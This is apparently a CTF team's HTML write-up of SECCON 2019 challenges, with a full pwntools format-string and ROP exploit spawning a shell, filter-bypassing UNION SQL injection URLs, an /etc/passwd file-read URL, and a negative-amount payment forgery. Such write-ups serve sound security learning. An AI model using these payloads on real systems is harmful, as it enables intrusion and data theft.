@@ -1,0 +1,400 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>SECCON 2019 Online CTF</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#coffee_break">coffee_break</a>
+    
+                <a class="dropdown-item" href="#zkpay">zkpay</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#lazy">lazy</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pngbomb">pngbomb</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#option-cmd-u">option-cmd-u</a>
+    
+                <a class="dropdown-item" href="#web_search">web_search</a>
+    
+                <a class="dropdown-item" href="#fileserver">fileserver</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#coffee_break" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">coffee_break</span>
+            </a>
+    
+<a href="#zkpay" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">zkpay</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#lazy" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">lazy</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#pngbomb" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pngbomb</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#option-cmd-u" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">option-cmd-u</span>
+            </a>
+    
+<a href="#web_search" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">web_search</span>
+            </a>
+    
+<a href="#fileserver" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">fileserver</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="seccon-2019-online-ctf"><a class="header-link" href="#seccon-2019-online-ctf"></a>SECCON 2019 Online CTF</h1>
+
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="coffee_break"><a class="header-link" href="#coffee_break"></a>coffee_break</h3>
+<p>We are given the encrypted flag <code>FyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905</code>. The encryption is described as follow.
+Firstly, it is encrypted by an encryption function <code>encrypt</code> defined in the code, with key <code>SECCON</code>, then it&#39;s padded.
+Secondly, it is then encrypted by ECB mode AES, with key <code>seccon2019\0\0\0\0...\0</code>.
+Both of them are obviously invertible, which gave us the flag.</p>
+<p><code>SECCON{Success_Decryption_Yeah_Yeah_SECCON}</code></p>
+<h3 id="zkpay"><a class="header-link" href="#zkpay"></a>ZKPay</h3>
+<p>After Registering the site with any new username and password, we know there are 500 dollar in a new account and our goal is to make an account with more than 1,000,000 dollar.</p>
+<p>Use the functionality &quot;Send Money&quot;, it generates a QR code with the following text value:</p>
+<pre class="hljs"><code>username=helloworld&amp;amount=<span class="hljs-number">100</span>&amp;proof=MN5WdjPmu9rNgswKNMYaA2Ktw9qa01YD4LGQmPIqo+slMSAwTD7QBwdxfVNnTm+PntPhzuNAqLKXAT0Pcfn6nlusRxswCjCdAjvql47aX8W5UrCtwvaQkYu7OjyWL4kmCwk25T<span class="hljs-regexp">/cLcnLd0WV7PZQ7fPVyGICHRDgwzvhrpmVKeXClZBiwagMMCAwxsG5bgjAaRO85MQQJwfFNaKP85KTzu2XWhnzGBjL9SQwCjA0TYNsuNLj7Vq2z5ZGnZEGp9RW0hQ7Q9HMwkQwvKHdATEgMIlaN2hxW+dol7Xq1ysg/</span>ZUEM2j6<span class="hljs-regexp">/6D3/</span>TY<span class="hljs-regexp">/p567VwArMAowtsm/</span>Hzj2y18pjeXV3ZMWfhGdn0dz0iZdgE9ccL1ZqwswCjCEKxwu1THo1s5a8InYdF16UwKQuDNfvjDoWYCpciUlJjEK&amp;hash=e87511c561c5eb1ece61dfe556537cc1152479ff8e1f721eff16d7248adde849</code></pre><p>Try to generate one more QR code with different amount of money, we see that only the &quot;amount&quot; value differs. Hence, we can forge some strange amount of money in our transaction.</p>
+<p>If we send minus amount to another account, my Balance will increase.</p>
+<p>Just send a huge minus amount, i.e. -999501, and you&#39;ll get the flag.</p>
+<p>flag: <code>SECCON{y0u_know_n07h1ng_3xcep7_7he_f4ct_th47_1_kn0w}</code></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="lazy"><a class="header-link" href="#lazy"></a>Lazy</h3>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}</span>
+
+context.arch = <span class="hljs-string">'amd64'</span>
+e = ELF( <span class="hljs-string">'./lazy'</span> )
+y = remote( <span class="hljs-string">'lazy.chal.seccon.jp'</span> , <span class="hljs-number">33333</span> )
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pri</span><span class="hljs-params">( p )</span>:</span>
+    y.sendlineafter( <span class="hljs-string">'4: Manage'</span> , <span class="hljs-string">'4'</span> )
+    y.sendlineafter( <span class="hljs-string">'Input file name'</span> , p )
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">( adr )</span>:</span>
+    y.sendlineafter( <span class="hljs-string">'4: Manage'</span> , <span class="hljs-string">'4'</span> )
+    p = <span class="hljs-string">'%7$sABCD'</span>.ljust( <span class="hljs-number">0x8</span> , <span class="hljs-string">'a'</span> ) + p64( adr )
+    y.sendlineafter( <span class="hljs-string">'Input file name'</span> , p )
+    y.recvuntil( <span class="hljs-string">'Filename : '</span> )
+    d = y.recvuntil( <span class="hljs-string">'ABCD'</span> )[:<span class="hljs-number">-4</span>] + <span class="hljs-string">'\0'</span>
+    <span class="hljs-keyword">return</span> d
+
+y.sendlineafter( <span class="hljs-string">'3: Exit'</span> , <span class="hljs-string">'2'</span> )
+y.sendlineafter( <span class="hljs-string">':'</span> , <span class="hljs-string">'_H4CK3R_'</span> )
+y.sendlineafter( <span class="hljs-string">':'</span> , <span class="hljs-string">'3XPL01717'</span> )
+
+p = <span class="hljs-string">'%7$s%9$p'</span>.ljust( <span class="hljs-number">0x8</span> , <span class="hljs-string">'a'</span> ) + p64( e.got.read )
+pri( p )
+y.recvuntil( <span class="hljs-string">'Filename : '</span> )
+l = u64( y.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">'\0\0'</span> )
+
+y.recvuntil( <span class="hljs-string">'0x'</span> )
+canary = int( y.recvuntil( <span class="hljs-string">'00'</span> ) , <span class="hljs-number">16</span> )
+<span class="hljs-keyword">print</span> hex( canary )
+
+
+d = DynELF( leak, l - <span class="hljs-number">0xd6000</span> )
+system = d.lookup( <span class="hljs-string">'system'</span>, <span class="hljs-string">'libc'</span> )
+<span class="hljs-keyword">print</span> hex( system )
+
+pop_rdi = <span class="hljs-number">0x00000000004015f3</span>
+ppr = <span class="hljs-number">0x00000000004015f1</span>
+
+download = <span class="hljs-number">0x400E23</span>
+listing = <span class="hljs-number">0x400D72</span>
+
+csu = <span class="hljs-number">0x4015D0</span>
+
+d = e.bss() + <span class="hljs-number">0x100</span>
+
+p = flat(
+    <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span>,
+    <span class="hljs-number">0</span> , <span class="hljs-number">0</span> ,
+    canary,
+    <span class="hljs-number">0</span>,
+    e.plt.atoi,
+    pop_rdi,
+    <span class="hljs-number">0</span>,
+    ppr, d , <span class="hljs-number">0</span>, e.plt.read,
+    pop_rdi,
+    d,
+    system
+)
+pri( p )
+
+y.sendafter( <span class="hljs-string">'No such file!'</span> , <span class="hljs-string">'/bin/sh\0'</span> )
+
+y.interactive()</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="pngbomb"><a class="header-link" href="#pngbomb"></a>pngbomb</h3>
+<p>We are given an png image. The image is <code>2147483647 x 32, 1-bit grayscale, non-interlaced</code>, but due to the DEFLATE algorithm of png format, the image itself is as small as <code>36MB</code>.</p>
+<p>We can get the compressed data via <code>binwalk</code> (Bytes <code>0x29~</code>). It is a Zlib compressed data. Though we may not extract the data into a file, we can pipe it to our program, and read it as streaming data.</p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="option-cmd-u"><a class="header-link" href="#option-cmd-u"></a>Option-Cmd-U</h3>
+<p>Our target is to visit <a href="http://nginx/flag.php">http://nginx/flag.php</a></p>
+<p>And the <code>nginx</code>&#39;s IP is <code>172.18.0.3</code></p>
+<p>We can use DNS-Rebinding to bypass restriction:</p>
+<p>172.18.0.3 <---> any ip</p>
+<p>=&gt; <code>SECCON{what_a_easy_bypass_314208thg0n423g}</code></p>
+<h3 id="web_search"><a class="header-link" href="#web_search"></a>web_search</h3>
+<p>single quote:</p>
+<ul class="list">
+<li><code>&#39;</code> =&gt; Error</li>
+<li><code>&#39;&#39;</code> =&gt; OK</li>
+<li><code>&#39;&#39;&#39;</code> =&gt; Error</li>
+<li><code>&#39;#</code> =&gt; OK</li>
+</ul>
+<p>So this is a SQL Injection challenge.</p>
+<p>But it will filter <code>and</code>, <code>or</code>, <code>%20</code>, <code>,</code>, ....</p>
+<p>We can use some trick to bypass it, e.g. <code>anandd</code> =&gt; <code>and</code>, <code>oorr</code> =&gt; <code>or</code>, and replace <code>%20</code> with <code>/**/</code></p>
+<p>If we try <code>&#39;or 2=2 #</code>, it will output <code>The flag is &quot;SECCON{Yeah_Sqli_Success_&quot; ... well, the rest of flag is in &quot;flag&quot; table. Try more!</code>.</p>
+<p>And we can use UNION-based MySQL Injection to dump the second half flag:</p>
+<p><code>http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/1)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23</code></p>
+<p><br></p>
+<p>get the db name:</p>
+<p><code>http://web-search.chal.seccon.jp/?q=&#39;anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(schema_name)/**/from/**/infoorrmation_schema.schemata)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23</code></p>
+<p>=&gt; <code>seccon_sqli</code></p>
+<p><br></p>
+<p>get the table name:</p>
+<p><code>http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(table_name)/**/from/**/infoorrmation_schema.tables)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23</code></p>
+<p>=&gt; <code>flag</code></p>
+<p><br></p>
+<p>get the column name:</p>
+<p><code>http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=%27flag%27)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23</code></p>
+<p>=&gt; piece</p>
+<p><br></p>
+<p>get the flag:</p>
+<p><code>http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(piece)/**/from/**/flag)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23</code></p>
+<p>=&gt; <code>You_Win_Yeah}</code></p>
+<p>so the flag is <code>SECCON{Yeah_Sqli_Success_You_Win_Yeah}</code></p>
+<h3 id="fileserver"><a class="header-link" href="#fileserver"></a>fileserver</h3>
+<p>The source code of server is in <code>/app.rb</code>.</p>
+<p>The validation function has some problems, it will check <code>[</code> before checking <code>{</code></p>
+<p>So we can use <code>{[}</code> to bypass the validation, it will not raise 400 Bad Request.</p>
+<p>And we can use it to read arbitrary file:</p>
+<p><a href="http://fileserver.chal.seccon.jp:9292/%7B,%5B%7D/etc/passwd">http://fileserver.chal.seccon.jp:9292/%7B,%5B%7D/etc/passwd</a></p>
+<p>Use <code>/%00/</code> to list directory and get the flag filename:</p>
+<p><code>http://fileserver.chal.seccon.jp:9292/%00/tmp/flags/</code></p>
+<p>=&gt; <code>/tmp/flags/qqVnBHOmIS0SIJz97VLGaWXs2CtuQBNW.txt</code></p>
+<p>flag: <code>SECCON{You_are_the_Globbin&#39;_Slayer}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
